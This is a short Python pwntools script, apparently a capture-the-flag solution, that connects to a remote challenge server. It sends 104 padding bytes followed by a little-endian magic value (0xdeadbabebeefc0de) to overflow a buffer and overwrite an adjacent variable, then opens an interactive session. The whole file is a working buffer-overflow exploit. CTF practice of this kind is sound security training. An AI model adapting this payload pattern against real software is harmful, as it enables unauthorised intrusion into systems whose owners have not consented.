import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13489


def make_payload():
    magic_value = 0xdeadbabebeefc0de
    payload = b'A'*104 + magic_value.to_bytes(8,'little')

    return payload

def main():
    server = remote(HOST, PORT)
    #server.interactive()
    #server.recvuntil(b">")
    #server.sendline(b"0")


    payload = make_payload()
    log.info(f"Sending payload {payload} of length {len(payload)}")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()


